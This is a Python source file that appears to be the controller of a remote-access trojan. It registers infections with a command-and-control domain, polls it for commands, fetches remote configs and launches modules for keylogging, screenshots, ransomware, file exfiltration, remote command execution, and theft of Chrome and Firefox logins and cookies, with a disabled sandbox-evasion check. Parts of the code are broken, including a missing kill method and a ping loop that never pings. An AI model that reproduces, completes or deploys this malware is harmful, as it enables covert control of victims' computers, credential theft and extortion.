import sys
import requests
import json
from time import time, sleep
from threading import Thread
from subprocess import check_output

# modules
from sandbox_detector import SandboxDetector
from dropbox_keylogger import DropboxKeylogger
from dropbox_screenshotter import DropboxScreenshotter
from dropbox_ransomware import DropboxRansomware
from dropbox_file_exfiltrator import DropboxFileExfiltrator
from dropbox_file_enumerator import DropboxFileEnumerator
from dropbox_cmd_executor import DropboxCMDExecutor
from dropbox_chrome_login_harvester import DropboxChromeLoginHarvester
from dropbox_chrome_cookie_harvester import DropboxChromeCookieHarvester
from dropbox_firefox_cookie_harvester import DropboxFirefoxCookieHarvester


class Trojan:

	"""
	valid commands:
	
	1 part:
		die
		pass
	
	2 parts:
		config <url of new MASTER config json>
		start <module_name e.g. DropboxKeylogger>
	
	3 parts:
		start_override <module_name> <url of temp MODULE config json>
	"""

	""" Takes the MASTER CONFIG DICT, as it manages running all other modules. """
	def __init__(self, config: dict, initial_config_src: str=None):
		# config
		self.config = config
		if initial_config_src is not None:
			# attempt to fetch initial config use it
			_r = requests.get(initial_config_src).text
			if 200 <= _r.status_code < 300:
				try:
					self.config = json.loads(_r.text)
				except json.JSONDecodeError:
					# non-json was received
					pass
		self.modules = {
			# determine if Trojan lives or dies
			'SandboxDetector': SandboxDetector,
			# when called, run for a period of time
			'DropboxKeylogger': DropboxKeylogger,
			'DropboxScreenshotter': DropboxScreenshotter,
			# when called, execute rapidly once
			'DropboxRansomware': DropboxRansomware,
			'DropboxFileExfiltrator': DropboxFileExfiltrator,
			'DropboxFileEnumerator': DropboxFileEnumerator,
			'DropboxCMDExecutor': DropboxCMDExecutor,
			'DropboxChromeCookieHarvester': DropboxChromeCookieHarvester,
			'DropboxChromeLoginHarvester': DropboxChromeLoginHarvester,
			'DropboxFirefoxCookieHarvester': DropboxFirefoxCookieHarvester,
		}
		# client info
		self._client_hwid = check_output('wmic csproduct get uuid').decode('utf-8').strip().split()[1]
		# state
		self._is_die_ordered = False
		self._last_command_timestamp_ms = None
		self._running_modules: dict[str, list[Thread]] = {}
	
	def _get_latest_command(self) -> dict:
		# /latest
		url = self.config['Trojan']['c2_domain'] + f'/latest?hwid={self._client_hwid}' 
		r = requests.get(url)
		return json.loads(r.text)

	def _post_ping(self) -> None:
		url = self.config['Trojan']['c2_domain'] + '/ping'
		requests.post(url, json={
			'hwid': self._client_hwid
		})

	def _post_current_config(self) -> None:
		# /config
		url = self.config['Trojan']['c2_domain'] + '/config'
		requests.post(url, json={
			'hwid': self._client_hwid,
			'config': self.config
		})

	def _post_new_infection(self) -> int:
		# /infected
		url = self.config['Trojan']['c2_domain'] + '/infected'
		r = requests.post(url, json={
			'hwid': self._client_hwid,
			'config': self.config,
			'infected': round(time() * 1000)
		})
		return r.status_code

	def _get_new_config(self, url) -> dict:
		try:
			r = requests.get(url)
			return json.loads(r.content)
		except json.decoder.JSONDecodeError:
			return None
	
	def _start_module(self, module_name: str, module_config: dict=None) -> None:
		# config can be overridden, which is why it is passed in as arg
		# starts module proc and appends it to the right proc list
		def _run():
			if module_config is None:
				self.modules[module_name](self.config[module_name]).run()
			else:
				self.modules[module_name](module_config).run()
		proc = Thread(target=_run, daemon=True)
		proc.start()
		if module_name not in self._running_modules:
			self._running_modules[module_name] = []
		self._running_modules[module_name].append(proc)
	
	def _flush_dead_processes(self) -> None:
		for module_name in self._running_modules.keys():
			procs = self._running_modules[module_name]
			self._running_modules[module_name] = [proc for proc in procs if proc.is_alive()]

	def run(self) -> None:
		"""
		# change sandbox detect to take config dict
		# GTFO if sandbox is detected
		if self.modules['SandboxDetector'](self.config['SandboxDetector']).run() is True:
			sys.exit()
		"""
		"""
		# either change this or remove this
		# problem is this starts every time the trojan is booted
		# post initial infection info, or die if re-infection is detected
		if self._post_new_infection() == 403:
			sys.exit()
		"""
		self._post_new_infection()
		# ping every interval so long as active, using a daemon Thread
		def _interval_ping():
			while True:
				sleep(self.config['Trojan']['c2_ping_interval_ms'] / 1000)
		Thread(target=_interval_ping, daemon=True).start()
		# main loop
		while not self._is_die_ordered:
			# update current config
			self._post_current_config()
			# fetch latest command (commands are a dict {'issuedTimestampMS':int..., 'body':str...})
			latest_command = self._get_latest_command()
			# make sure there is a latest command, otherwise just do nothing
			if type(latest_command) == dict:
				# if identifier does not match id of last command, 
				# and the command's age is less than the max age (not expired)
				# then do stuff (else, do nothing)
				if latest_command['issuedTimestampMS'] != self._last_command_timestamp_ms \
				and round(time()*1000) - latest_command['issuedTimestampMS'] <= self.config['Trojan']['command_max_age_ms']:
					# parse the command
					self._last_command_timestamp_ms = latest_command['issuedTimestampMS']
					args = latest_command['body'].split(' ')
					# act on the command
					if len(args) == 1:
						if args[0] == 'die':
							# kill all remaining running processes
							for module_name in self.config.keys():
								if module_name in self._running_modules:
									self._kill_module(module_name)
							# kill the main Trojan process
							sys.exit(0)
						elif args[0] == 'pass':
							pass
					elif len(args) == 2:
						if args[0] == 'config':
							# update master config
							config_src_url = args[1]
							new_config = self._get_new_config(config_src_url)
							if new_config is not None:
								# do not update config if new ones
								# were not successfully retrieved
								self.config = new_config
						elif args[0] == 'start':
							# start a process from the module and add it to the right proc list
							module_name = args[1]
							self._start_module(module_name, self.config[module_name])
					elif len(args) == 3:
						if args[0] == 'start_override':
							# logic of start, but also fetch and use a temporary config
							# for the MODULE, instead of self.config[ModuleName]
							module_name = args[1]
							temp_config_src_url = args[2]
							temp_config = self._get_new_config(temp_config_src_url)
							if temp_config is not None:
								self._start_module(module_name, temp_config)
				# remove all terminated and finished processes from the proc lists
				self._flush_dead_processes()
			# sleep for the specified interval in SECONDS
			sleep(self.config['Trojan']['c2_poll_interval_ms']/1000)
